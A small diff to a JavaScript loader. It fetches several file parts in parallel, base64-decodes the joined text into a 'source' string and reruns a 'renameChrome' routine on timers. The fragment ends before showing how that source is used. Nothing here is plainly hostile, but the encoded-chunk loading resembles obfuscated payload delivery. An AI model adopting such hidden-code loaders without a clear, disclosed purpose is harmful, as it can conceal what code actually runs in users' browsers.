@@ -52,17 +52,19 @@
   }
 
   async function loadParts() {
+    const responses = await Promise.all(PARTS.map((part) => fetch(`${part}?v=${VERSION}`, { cache: 'no-store' })));
     const chunks = [];
-    for (const part of PARTS) {
-      const response = await fetch(`${part}?v=${VERSION}`, { cache: 'no-store' });
+    for (let index = 0; index < PARTS.length; index += 1) {
+      const response = responses[index];
+      const part = PARTS[index];
       if (!response.ok) throw new Error(`Failed to load ${part}: ${response.status}`);
       chunks.push(await response.text());
     }
-    return atob(chunks.join(''));
+    return atob(chunks.join('').replace(/\s+/g, ''));
   }
 
   renameChrome();
-  [120, 1200, 3600, 9000].forEach((delay) => window.setTimeout(renameChrome, delay));
+  [120, 1200, 3600, 9000, 18000, 32000].forEach((delay) => window.setTimeout(renameChrome, delay));
 
   loadParts()
     .then((source) => {
